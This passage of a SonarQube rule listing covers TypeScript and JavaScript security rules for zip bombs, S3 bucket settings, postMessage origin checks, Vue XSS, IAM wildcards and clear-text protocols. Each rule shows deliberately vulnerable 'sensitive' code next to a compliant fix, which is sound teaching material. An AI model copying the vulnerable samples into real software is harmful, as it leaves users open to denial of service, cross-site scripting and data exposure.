<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    encryption: s3.BucketEncryption.KMS_MANAGED
});

# Alternatively with a KMS key managed by the user.

new s3.Bucket(this, 'id', {
    encryption: s3.BucketEncryption.KMS_MANAGED,
    encryptionKey: access_key
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html">AWS documentation</a> - Protecting data using
  server-side encryption </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html">AWS CDK version 2</a> - BucketEncryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5042">
              typescript:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://github.com/npm/node-tar">tar</a> module:</p>
<pre>
const tar = require('tar');

tar.x({ // Sensitive
  file: 'foo.tar.gz'
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip">adm-zip</a> module:</p>
<pre>
const AdmZip = require('adm-zip');

let zip = new AdmZip("./foo.zip");
zip.extractAllTo("."); // Sensitive
</pre>
<p>For <a href="https://stuk.github.io/jszip/">jszip</a> module:</p>
<pre>
const fs = require("fs");
const JSZip = require("jszip");

fs.readFile("foo.zip", function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) { // Sensitive
    zip.forEach(function (relativePath, zipEntry) {
      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(zipEntry.name);
      } else {
        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {
          fs.writeFileSync(zipEntry.name, content);
        });
      }
    });
  });
});
</pre>
<p>For <a href="https://github.com/thejoshwolfe/yauzl">yauzl</a> module</p>
<pre>
const yauzl = require('yauzl');

yauzl.open('foo.zip', function (err, zipfile) {
  if (err) throw err;

  zipfile.on("entry", function(entry) {
    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>For <a href="https://github.com/maxogden/extract-zip">extract-zip</a> module:</p>
<pre>
const extract = require('extract-zip')

async function main() {
  let target = __dirname + '/test';
  await extract('test.zip', { dir: target }); // Sensitive
}
main();
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://github.com/npm/node-tar">tar</a> module:</p>
<pre>
const tar = require('tar');
const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB

let fileCount = 0;
let totalSize = 0;

tar.x({
  file: 'foo.tar.gz',
  filter: (path, entry) =&gt; {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
      throw 'Reached max. number of files';
    }

    totalSize += entry.size;
    if (totalSize &gt; MAX_SIZE) {
      throw 'Reached max. size';
    }

    return true;
  }
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip">adm-zip</a> module:</p>
<pre>
const AdmZip = require('adm-zip');
const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

let fileCount = 0;
let totalSize = 0;
let zip = new AdmZip("./foo.zip");
let zipEntries = zip.getEntries();
zipEntries.forEach(function(zipEntry) {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
    }

    let entrySize = zipEntry.getData().length;
    totalSize += entrySize;
    if (totalSize &gt; MAX_SIZE) {
        throw 'Reached max. size';
    }

    let compressionRatio = entrySize / zipEntry.header.compressedSize;
    if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw 'Reached max. compression ratio';
    }

    if (!zipEntry.isDirectory) {
        zip.extractEntryTo(zipEntry.entryName, ".");
    }
});
</pre>
<p>For <a href="https://stuk.github.io/jszip/">jszip</a> module:</p>
<pre>
const fs = require("fs");
const pathmodule = require("path");
const JSZip = require("jszip");

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB

let fileCount = 0;
let totalSize = 0;
let targetDirectory = __dirname + '/archive_tmp';

fs.readFile("foo.zip", function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) {
    zip.forEach(function (relativePath, zipEntry) {
      fileCount++;
      if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
      }

      // Prevent ZipSlip path traversal (S6096)
      const resolvedPath = pathmodule.join(targetDirectory, zipEntry.name);
      if (!resolvedPath.startsWith(targetDirectory)) {
        throw 'Path traversal detected';
      }

      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(resolvedPath);
      } else {
        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {
          totalSize += content.length;
          if (totalSize &gt; MAX_SIZE) {
            throw 'Reached max. size';
          }

          fs.writeFileSync(resolvedPath, content);
        });
      }
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/thejoshwolfe/yauzl">yauzl</a> module</p>
<pre>
const yauzl = require('yauzl');

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

yauzl.open('foo.zip', function (err, zipfile) {
  if (err) throw err;

  let fileCount = 0;
  let totalSize = 0;

  zipfile.on("entry", function(entry) {
    fileCount++;
    if (fileCount &gt; MAX_FILES) {
      throw 'Reached max. number of files';
    }

    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
    // Alternatively, calculate the size from the readStream.
    let entrySize = entry.uncompressedSize;
    totalSize += entrySize;
    if (totalSize &gt; MAX_SIZE) {
      throw 'Reached max. size';
    }

    if (entry.compressedSize &gt; 0) {
      let compressionRatio = entrySize / entry.compressedSize;
      if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw 'Reached max. compression ratio';
      }
    }

    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/maxogden/extract-zip">extract-zip</a> module:</p>
<pre>
const extract = require('extract-zip')

const MAX_FILES = 10000;
const MAX_SIZE = 1000000000; // 1 GB
const THRESHOLD_RATIO = 10;

async function main() {
  let fileCount = 0;
  let totalSize = 0;

  let target = __dirname + '/foo';
  await extract('foo.zip', {
    dir: target,
    onEntry: function(entry, zipfile) {
      fileCount++;
      if (fileCount &gt; MAX_FILES) {
        throw 'Reached max. number of files';
      }

      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
      // Alternatively, calculate the size from the readStream.
      let entrySize = entry.uncompressedSize;
      totalSize += entrySize;
      if (totalSize &gt; MAX_SIZE) {
        throw 'Reached max. size';
      }

      if (entry.compressedSize &gt; 0) {
        let compressionRatio = entrySize / entry.compressedSize;
        if (compressionRatio &gt; THRESHOLD_RATIO) {
          throw 'Reached max. compression ratio';
        }
      }
    }
  });
}
main();
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6252">
              typescript:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The bucket stores information that require high availability. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    versioned: false // Sensitive
});
</pre>
<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    versioned: true
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html">AWS documentation</a> - Using versioning in S3 buckets </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned">AWS CDK version 2</a> - Using versioning in S3
  buckets </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2819">
              typescript:S2819
            </a>
          </td>
          <td>
            <details>
              <p>Cross-origin communication allows different websites to interact with each other. This interaction is typically achieved through mechanisms like
AJAX requests, WebSockets, or postMessage API. However, a vulnerability can arise when these communications are not properly secured by verifying
their origins.</p>
<h2>Why is this an issue?</h2>
<p>Without origin verification, the target website cannot distinguish between legitimate requests from its own pages and malicious requests from an
attacker’s site. The attacker can craft a malicious website or script that sends requests to a target website where the user is already
authenticated.</p>
<p>This vulnerability class is not about a single specific user input or action, but rather a series of actions that lead to an insecure cross-origin
communication.</p>
<h3>What is the potential impact?</h3>
<p>The absence of origin verification during cross-origin communications can lead to serious security issues.</p>
<h4>Data Breach</h4>
<p>If an attacker can successfully exploit this vulnerability, they may gain unauthorized access to sensitive data. For instance, a user’s personal
information, financial details, or other confidential data could be exposed. This not only compromises the user’s privacy but can also lead to
identity theft or financial loss.</p>
<h4>Unauthorized Actions</h4>
<p>An attacker could manipulate the communication between websites to perform actions on behalf of the user without their knowledge. This could range
from making unauthorized purchases to changing user settings or even deleting accounts.</p>
<h2>How to fix it</h2>
<p>When sending a message, avoid using <code>*</code> for the target origin (it means no preference). Instead define it explicitly so the message will
only be dispatched to this URI. When receiving the message, verify the orgin to be sure that it is sent by an authorized sender.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>When sending a message:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
var iframe = document.getElementById("testiframe");
iframe.contentWindow.postMessage("hello", "*"); // Noncompliant: * is used
</pre>
<p>When receiving a message:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
window.addEventListener("message", function(event) { // Noncompliant: no checks are done on the origin property.
  console.log(event.data);
 });
</pre>
<h4>Compliant solution</h4>
<p>When sending a message:</p>
<pre data-diff-id="1" data-diff-type="compliant">
var iframe = document.getElementById("testiframe");
iframe.contentWindow.postMessage("hello", "https://secure.example.com");
</pre>
<p>When receiving a message:</p>
<pre data-diff-id="2" data-diff-type="compliant">
window.addEventListener("message", function(event) {
  if (event.origin !== "http://example.org")
    return;

  console.log(event.data)
});
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> MDN web docs - <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">postMessage API</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/345">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6281">
              typescript:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>
<ul>
  <li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>
  <li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>
  <li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>
  <li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li>
</ul>
<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The
public policies can still affect the S3 bucket.</p>
<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to
<code>BlockPublicAccess.BLOCK_ALL</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>
  <li> These settings are not already enforced to true at the account level. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul>
  <li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li>
  <li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li>
  <li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li>
  <li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket'
}); // Sensitive
</pre>
<p>This <code>block_public_access</code> allows public ACL to be set:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : false, // Sensitive
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL
});
</pre>
<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>
<pre>
const s3 = require('aws-cdk-lib/aws-s3');

new s3.Bucket(this, 'id', {
    bucketName: 'bucket',
    blockPublicAccess: new s3.BlockPublicAccess({
        blockPublicAcls         : true,
        blockPublicPolicy       : true,
        ignorePublicAcls        : true,
        restrictPublicBuckets   : true
    })
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html">AWS CDK version 2</a> - BlockPublicAccess </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2817">
              typescript:S2817
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some
browsers. (It is not supported in Firefox or IE.)</p>
<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>
<h3>Noncompliant code example</h3>
<pre>
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6299">
              typescript:S6299
            </a>
          </td>
          <td>
            <details>
              <p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like
<code>innerText</code> instead of <code>innerHtml</code>.</p>
<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will
introduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or
impersonating other users.</p>
<h2>Ask Yourself Whether</h2>
<p>The application needs to render HTML content which:</p>
<ul>
  <li> could be user-controlled and not previously sanitized. </li>
  <li> is difficult to understand how it was constructed. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as
  possible on built-in auto-escaping Vue.js features. </li>
  <li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript
  (<code>javascript:onClick(...)</code>). </li>
  <li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>
<pre>
&lt;div v-html="htmlContent"&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
Vue.component('element', {
  render: function (createElement) {
    return createElement(
      'div',
      {
        domProps: {
          innerHTML: this.htmlContent, // Noncompliant
        }
      }
    );
  },
});
</pre>
<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>
<pre>
&lt;div domPropsInnerHTML={this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{{ htmlContent }}&lt;/div&gt;
</pre>
<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>
<pre>
Vue.component('element', {
  render: function (createElement) {
    return createElement(
      'div',
      {
        domProps: {
          innerText: this.htmlContent,
        }
      },
      this.htmlContent // Child node
    );
  },
});
</pre>
<p>When using JSX, putting the content as a child node of the element is safe:</p>
<pre>
&lt;div&gt;{this.htmlContent}&lt;/div&gt;
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> <a href="https://vuejs.org/v2/guide/security.html#Injecting-HTML">Vue.js - Security - Injecting HTML</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6304">
              typescript:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a
href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>"*"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: ["iam:CreatePolicyVersion"],
            resources: ["*"] // Sensitive
        })
    ]
})
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
import { aws_iam as iam } from 'aws-cdk-lib'

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: ["iam:CreatePolicyVersion"],
            resources: ["arn:aws:iam:::policy/team1/*"]
        })
    ]
})
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>
  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5332">
              typescript:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url = "http://example.com"; // Sensitive
url = "ftp://anonymous@example.com"; // Sensitive
url = "telnet://anonymous@example.com"; // Sensitive
</pre>
<p>For <a href="https://nodemailer.com">nodemailer</a>:</p>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({
  secure: false, // Sensitive
  requireTLS: false // Sensitive
});
</pre>
<pre>
const nodemailer = require("nodemailer");
let transporter = nodemailer.createTransport({}); // Sensitive
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp">ftp</a>:</p>
<pre>
var Client = require('ftp');
var c = new Client();
c.connect({
  'secure': false // Sensitive
});
</pre>
<p>For <a href="https://github.com/mkozjak/node-telnet-client">telnet-client</a>:</p>
<pre>
const Telnet = require('telnet-client'); // Sensitive
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const alb = new ApplicationLoadBalancer(this, 'ALB', {
  vpc: vpc,
  internetFacing: true
});

alb.addListener('listener-http-default', {
  port: 8080,
  open: true
}); // Sensitive

alb.addListener('listener-http-explicit', {
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

new ApplicationListener(this, 'listener-http-explicit-constructor', {
  loadBalancer: alb,
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';

const nlb = new NetworkLoadBalancer(this, 'nlb', {
  vpc: vpc,
  internetFacing: true
});

var listenerNLB = nlb.addListener('listener-tcp-default', {
  port: 1234
}); // Sensitive

listenerNLB = nlb.addListener('listener-tcp-explicit', {
  protocol: Protocol.TCP, // Sensitive
  port: 1234
});
</pre>
<p>For <a
